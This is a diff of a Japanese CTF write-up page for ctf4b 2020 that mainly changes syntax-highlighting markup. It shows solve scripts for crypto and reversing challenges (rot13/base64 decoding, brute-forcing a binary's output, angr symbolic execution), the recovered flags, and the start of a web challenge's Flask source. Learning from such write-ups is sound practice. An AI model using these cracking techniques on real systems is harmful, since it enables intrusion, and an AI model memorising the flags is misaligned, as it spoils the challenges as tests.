@@ -62,7 +62,7 @@
   </ul>
 
   <ul>
-    <li><a href="#rb-crypto-52-pts-500-solves">R&B (Crypto, 52 pts, 500 solves)</a></li>
+    <li><a href="#rb-crypto-52-pts-500-solves">R&amp;B (Crypto, 52 pts, 500 solves)</a></li>
     <li><a href="#noisy-equations-crypto-261-pts-76-solves">Noisy equations (Crypto, 261 pts, 76 solves)</a></li>
   </ul>
 
@@ -98,17 +98,17 @@
 <p>「食べ物」に関連する絵文字の文字コードは近そうです。
 暗号文に使われている文字の文字コードからある数を引くとフラグになるのではないでしょうか？</p>
 <p>先頭の文字コードが0になるようにしてから，1ずつ足していきます。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">emoemoencode.txt</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;emoemoencode.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
     data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
 i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
 <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1000</span>):
-    dec <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+    dec <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
     <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> data:
         <span style="color:#66d9ef">try</span>:
-            dec<span style="color:#f92672">+</span><span style="color:#f92672">=</span> chr(ord(c) <span style="color:#f92672">-</span> ord(data[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> i)
+            dec<span style="color:#f92672">+=</span> chr(ord(c) <span style="color:#f92672">-</span> ord(data[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> i)
         <span style="color:#66d9ef">except</span>:
             <span style="color:#66d9ef">continue</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">ctf</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">in</span> dec:
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;ctf&#39;</span> <span style="color:#f92672">in</span> dec:
         <span style="color:#66d9ef">print</span>(dec)
         exit()
 </code></pre></div><p>フラグが得られました！</p>
@@ -122,8 +122,8 @@ ctf4b<span style="color:#f92672">{</span>stegan0graphy_by_em000000ji<span style=
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> os <span style="color:#f92672">import</span> getenv
 
 
-FLAG <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">FLAG</span><span style="color:#e6db74">&#34;</span>)
-FORMAT <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">FORMAT</span><span style="color:#e6db74">&#34;</span>)
+FLAG <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;FLAG&#34;</span>)
+FORMAT <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;FORMAT&#34;</span>)
 
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rot13</span>(s):
@@ -135,10 +135,10 @@ FORMAT <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74"><
 
 
 <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> FORMAT:
-    <span style="color:#66d9ef">if</span> t <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">R</span><span style="color:#e6db74">&#34;</span>:
-        FLAG <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">R</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> rot13(FLAG)
-    <span style="color:#66d9ef">if</span> t <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#34;</span>:
-        FLAG <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> base64(FLAG)
+    <span style="color:#66d9ef">if</span> t <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;R&#34;</span>:
+        FLAG <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;R&#34;</span> <span style="color:#f92672">+</span> rot13(FLAG)
+    <span style="color:#66d9ef">if</span> t <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;B&#34;</span>:
+        FLAG <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">+</span> base64(FLAG)
 
 <span style="color:#66d9ef">print</span>(FLAG)
 </code></pre></div><p>フラグを<code>rot13</code>と<code>base64</code>を用いて暗号化しています。</p>
@@ -146,14 +146,14 @@ FORMAT <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74"><
 <p>復号するスクリプトを書きました。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> codecs
 
-<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">encoded_flag</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;encoded_flag&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
     data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
 
-<span style="color:#66d9ef">while</span> (data[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">R</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">or</span> data[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span>):
-    <span style="color:#66d9ef">if</span> data[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">R</span><span style="color:#e6db74">&#39;</span>:
-        data <span style="color:#f92672">=</span> codecs<span style="color:#f92672">.</span>decode(data[<span style="color:#ae81ff">1</span>:], <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">rot13</span><span style="color:#e6db74">&#39;</span>)
-    <span style="color:#66d9ef">elif</span> data[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span>:
-        data <span style="color:#f92672">=</span> codecs<span style="color:#f92672">.</span>decode(data[<span style="color:#ae81ff">1</span>:]<span style="color:#f92672">.</span>encode(), <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">base64_codec</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#66d9ef">while</span> (data[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;R&#39;</span> <span style="color:#f92672">or</span> data[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;B&#39;</span>):
+    <span style="color:#66d9ef">if</span> data[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;R&#39;</span>:
+        data <span style="color:#f92672">=</span> codecs<span style="color:#f92672">.</span>decode(data[<span style="color:#ae81ff">1</span>:], <span style="color:#e6db74">&#39;rot13&#39;</span>)
+    <span style="color:#66d9ef">elif</span> data[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;B&#39;</span>:
+        data <span style="color:#f92672">=</span> codecs<span style="color:#f92672">.</span>decode(data[<span style="color:#ae81ff">1</span>:]<span style="color:#f92672">.</span>encode(), <span style="color:#e6db74">&#39;base64_codec&#39;</span>)
     <span style="color:#66d9ef">try</span>:
         data <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>decode()
     <span style="color:#66d9ef">except</span>:
@@ -172,8 +172,8 @@ ctf4b<span style="color:#f92672">{</span>rot_base_rot_base_rot_base_base<span st
 <span style="color:#f92672">from</span> random <span style="color:#f92672">import</span> getrandbits, seed
 
 
-FLAG <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">FLAG</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>encode()
-SEED <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">SEED</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>encode()
+FLAG <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;FLAG&#34;</span>)<span style="color:#f92672">.</span>encode()
+SEED <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;SEED&#34;</span>)<span style="color:#f92672">.</span>encode()
 
 L <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span>
 N <span style="color:#f92672">=</span> len(FLAG)
@@ -213,8 +213,8 @@ flag <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>
 flag_list <span style="color:#f92672">=</span> flag<span style="color:#f92672">.</span>tolist()
 
 <span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> flag_list:
-    <span style="color:#66d9ef">print</span>(chr(round(a)),end<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>)
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>)
+    <span style="color:#66d9ef">print</span>(chr(round(a)),end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;</span>)
 </code></pre></div><p>実行すると，フラグが得られました。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/ctf/ctf4b-2020/crypto/noisy-equations$ python3 solve2.py 
 ctf4b<span style="color:#f92672">{</span>r4nd0m_533d_15_n3c3554ry_f0r_53cur17y<span style="color:#f92672">}</span>
@@ -230,7 +230,7 @@ Putting on masks...
 ddae
 bhac
 Wrong FLAG. Try again.
-kali@kali:~/ctf/ctf4b-2020/rev$ ./mask flag<span style="color:#f92672">{</span><span style="color:#f92672">}</span>
+kali@kali:~/ctf/ctf4b-2020/rev$ ./mask flag<span style="color:#f92672">{}</span>
 Putting on masks...
 ddaequ
 bhacki
@@ -256,15 +256,15 @@ puts<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Wrong F
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> subprocess
 <span style="color:#f92672">import</span> string
 
-enc <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">atd4`qdedtUpetepqeUdaaeUeaqau</span><span style="color:#e6db74">&#34;</span>
-flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">ctf4b{</span><span style="color:#e6db74">&#39;</span>
-<span style="color:#66d9ef">while</span> flag[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>:
+enc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;atd4`qdedtUpetepqeUdaaeUeaqau&#34;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ctf4b{&#39;</span>
+<span style="color:#66d9ef">while</span> flag[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;}&#39;</span>:
     <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>printable:
         tmp <span style="color:#f92672">=</span> flag <span style="color:#f92672">+</span> c
 
-        proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run([<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./mask</span><span style="color:#e6db74">&#39;</span>, tmp], check<span style="color:#f92672">=</span>True, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)
+        proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run([<span style="color:#e6db74">&#39;./mask&#39;</span>, tmp], check<span style="color:#f92672">=</span>True, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)
         ans <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>decode()
-        ans <span style="color:#f92672">=</span> ans<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]
+        ans <span style="color:#f92672">=</span> ans<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]
         <span style="color:#66d9ef">if</span> ans <span style="color:#f92672">in</span> enc:
             flag <span style="color:#f92672">=</span> tmp
             <span style="color:#66d9ef">print</span>(flag)
@@ -303,7 +303,7 @@ puts<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Putting
 <span style="color:#f92672">)</span>                                                                                           <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>
 puts<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;atd4`qdedtUpetepqeUdaaeUeaqau&#34;</span>atd4<span style="color:#e6db74">`</span>qdedtUpetepqeUdaaeUeaqau
 <span style="color:#f92672">)</span>                                                                                 <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>
-puts<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c`b bk`a``A`a`a`aaA`aaaAaaaaa&#34;</span>c<span style="color:#e6db74">`</span>b bk<span style="color:#e6db74">`</span>a<span style="color:#e6db74">`</span><span style="color:#e6db74">`</span>A<span style="color:#e6db74">`</span>a<span style="color:#e6db74">`</span>a<span style="color:#e6db74">`</span>aaA<span style="color:#e6db74">`</span>aaaAaaaaa
+puts<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c`b bk`a``A`a`a`aaA`aaaAaaaaa&#34;</span>c<span style="color:#e6db74">`</span>b bk<span style="color:#e6db74">`</span>a<span style="color:#e6db74">``</span>A<span style="color:#e6db74">`</span>a<span style="color:#e6db74">`</span>a<span style="color:#e6db74">`</span>aaA<span style="color:#e6db74">`</span>aaaAaaaaa
 <span style="color:#f92672">)</span>                                                                                 <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>
 strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;atd4`qdedtUpetepqeUdaaeUeaqau&#34;</span>, <span style="color:#e6db74">&#34;atd4`qdedtUpetepqeUdaaeUeaqau&#34;</span><span style="color:#f92672">)</span>                                              <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
 strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;c`b bk`a``A`a`a`aaA`aaaAaaaaa&#34;</span>, <span style="color:#e6db74">&#34;c`b bk`kj`KbababcaKbacaKiacki&#34;</span><span style="color:#f92672">)</span>                                              <span style="color:#f92672">=</span> -10
@@ -316,18 +316,18 @@ puts<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Wrong F
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> subprocess
 <span style="color:#f92672">import</span> string
 
-enc1 <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">atd4`qdedtUpetepqeUdaaeUeaqau</span><span style="color:#e6db74">&#34;</span>
-enc2 <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">c`b bk`kj`KbababcaKbacaKiacki</span><span style="color:#e6db74">&#34;</span>
+enc1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;atd4`qdedtUpetepqeUdaaeUeaqau&#34;</span>
+enc2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;c`b bk`kj`KbababcaKbacaKiacki&#34;</span>
 <span style="color:#75715e"># flag = &#39;ctf4b{&#39;</span>
-flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">ctf4b{</span><span style="color:#e6db74">&#39;</span>
-<span style="color:#66d9ef">while</span> flag[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>:
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ctf4b{&#39;</span>
+<span style="color:#66d9ef">while</span> flag[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;}&#39;</span>:
     <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>printable:
         tmp <span style="color:#f92672">=</span> flag <span style="color:#f92672">+</span> c
 
-        proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run([<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./mask</span><span style="color:#e6db74">&#39;</span>, tmp], check<span style="color:#f92672">=</span>True, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)
+        proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run([<span style="color:#e6db74">&#39;./mask&#39;</span>, tmp], check<span style="color:#f92672">=</span>True, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)
         ans <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>decode()
-        ans1 <span style="color:#f92672">=</span> ans<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]
-        ans2 <span style="color:#f92672">=</span> ans<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]
+        ans1 <span style="color:#f92672">=</span> ans<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]
+        ans2 <span style="color:#f92672">=</span> ans<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]
         <span style="color:#66d9ef">if</span> (ans1 <span style="color:#f92672">in</span> enc1) <span style="color:#f92672">and</span> (ans2 <span style="color:#f92672">in</span> enc2):
             flag <span style="color:#f92672">=</span> tmp
             <span style="color:#66d9ef">print</span>(flag)
@@ -367,11 +367,11 @@ ctf4b<span style="color:#f92672">{</span>dont_reverse_face_mask<span style="colo
 <p>上記リンクにサンプルコードが載っています。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> angr
 
-project <span style="color:#f92672">=</span> angr<span style="color:#f92672">.</span>Project(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">angr-doc/examples/defcamp_r100/r100</span><span style="color:#e6db74">&#34;</span>, auto_load_libs<span style="color:#f92672">=</span>False)
+project <span style="color:#f92672">=</span> angr<span style="color:#f92672">.</span>Project(<span style="color:#e6db74">&#34;angr-doc/examples/defcamp_r100/r100&#34;</span>, auto_load_libs<span style="color:#f92672">=</span>False)
 
 <span style="color:#a6e22e">@project.hook</span>(<span style="color:#ae81ff">0x400844</span>)
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_flag</span>(state):
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">FLAG SHOULD BE:</span><span style="color:#e6db74">&#34;</span>, state<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>dumps(<span style="color:#ae81ff">0</span>))
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;FLAG SHOULD BE:&#34;</span>, state<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>dumps(<span style="color:#ae81ff">0</span>))
     project<span style="color:#f92672">.</span>terminate_execution()
 
 project<span style="color:#f92672">.</span>execute()
@@ -382,11 +382,11 @@ project<span style="color:#f92672">.</span>execute()
 <p>サンプルコードを以下のように修正します。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> angr
 
-project <span style="color:#f92672">=</span> angr<span style="color:#f92672">.</span>Project(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./yakisoba</span><span style="color:#e6db74">&#39;</span>, main_opts<span style="color:#f92672">=</span>{<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">base_addr</span><span style="color:#e6db74">&#39;</span>: <span style="color:#ae81ff">0x0</span>})
+project <span style="color:#f92672">=</span> angr<span style="color:#f92672">.</span>Project(<span style="color:#e6db74">&#39;./yakisoba&#39;</span>, main_opts<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;base_addr&#39;</span>: <span style="color:#ae81ff">0x0</span>})
 
 <span style="color:#a6e22e">@project.hook</span>(<span style="color:#ae81ff">0x6d2</span>)
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_flag</span>(state):
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">FLAG SHOULD BE:</span><span style="color:#e6db74">&#34;</span>, state<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>dumps(<span style="color:#ae81ff">0</span>))
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;FLAG SHOULD BE:&#34;</span>, state<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>dumps(<span style="color:#ae81ff">0</span>))
     project<span style="color:#f92672">.</span>terminate_execution()
 
 project<span style="color:#f92672">.</span>execute()
@@ -397,7 +397,7 @@ WARNING | 2020-05-25 20:44:46,547 | angr.state_plugins.symbolic_memory | angr wi
 WARNING | 2020-05-25 20:44:46,547 | angr.state_plugins.symbolic_memory | 1<span style="color:#f92672">)</span> setting a value to the initial state
 WARNING | 2020-05-25 20:44:46,547 | angr.state_plugins.symbolic_memory | 2<span style="color:#f92672">)</span> adding the state option ZERO_FILL_UNCONSTRAINED_<span style="color:#f92672">{</span>MEMORY,REGISTERS<span style="color:#f92672">}</span>, to make unknown regions hold null
 WARNING | 2020-05-25 20:44:46,547 | angr.state_plugins.symbolic_memory | 3<span style="color:#f92672">)</span> adding the state option SYMBOL_FILL_UNCONSTRAINED_<span style="color:#f92672">{</span>MEMORY_REGISTERS<span style="color:#f92672">}</span>, to suppress these messages.
-WARNING | 2020-05-25 20:44:46,547 | angr.state_plugins.symbolic_memory | Filling memory at 0x7fffffffffefff8 with <span style="color:#ae81ff">8</span> unconstrained bytes referenced from 0x109d03d <span style="color:#f92672">(</span>explicit_bzero+0x8c6d in libc.so.6 <span style="color:#f92672">(</span>0x9d03d<span style="color:#f92672">)</span><span style="color:#f92672">)</span>
+WARNING | 2020-05-25 20:44:46,547 | angr.state_plugins.symbolic_memory | Filling memory at 0x7fffffffffefff8 with <span style="color:#ae81ff">8</span> unconstrained bytes referenced from 0x109d03d <span style="color:#f92672">(</span>explicit_bzero+0x8c6d in libc.so.6 <span style="color:#f92672">(</span>0x9d03d<span style="color:#f92672">))</span>
 FLAG SHOULD BE: b<span style="color:#e6db74">&#39;ctf4b{sp4gh3tt1_r1pp3r1n0}\x00\xd9\xd9\xd9\xd9&#39;</span>
 </code></pre></div><p><code>ctf4b{sp4gh3tt1_r1pp3r1n0}</code></p>
 <h1 id="web">Web</h1>
@@ -426,68 +426,68 @@ Your task is to enumerate the employees who use this tool in order to make it av
 <span style="color:#75715e"># ====================</span>
 
 app <span style="color:#f92672">=</span> Flask(__name__)
-app<span style="color:#f92672">.</span>SALT <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">CTF4B_SALT</span><span style="color:#e6db74">&#34;</span>)
-app<span style="color:#f92672">.</span>FLAG <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">CTF4B_FLAG</span><span style="color:#e6db74">&#34;</span>)
-app<span style="color:#f92672">.</span>SECRET_KEY <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">CTF4B_SECRET_KEY</span><span style="color:#e6db74">&#34;</span>)
+app<span style="color:#f92672">.</span>SALT <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;CTF4B_SALT&#34;</span>)
+app<span style="color:#f92672">.</span>FLAG <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;CTF4B_FLAG&#34;</span>)
+app<span style="color:#f92672">.</span>SECRET_KEY <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;CTF4B_SECRET_KEY&#34;</span>)
 
 db<span style="color:#f92672">.</span>init()
 employees <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span>get_all_employees()
 
 <span style="color:#75715e"># ====================</span>
 
-<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/</span><span style="color:#e6db74">&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">GET</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">POST</span><span style="color:#e6db74">&#34;</span>])
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
     t <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>perf_counter()
 
-    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">GET</span><span style="color:#e6db74">&#34;</span>:
-        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">index.html</span><span style="color:#e6db74">&#34;</span>, message<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Please login.</span><span style="color:#e6db74">&#34;</span>, sec<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{:.7f}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(time<span style="color:#f92672">.</span>perf_counter()<span style="color:#f92672">-</span>t))
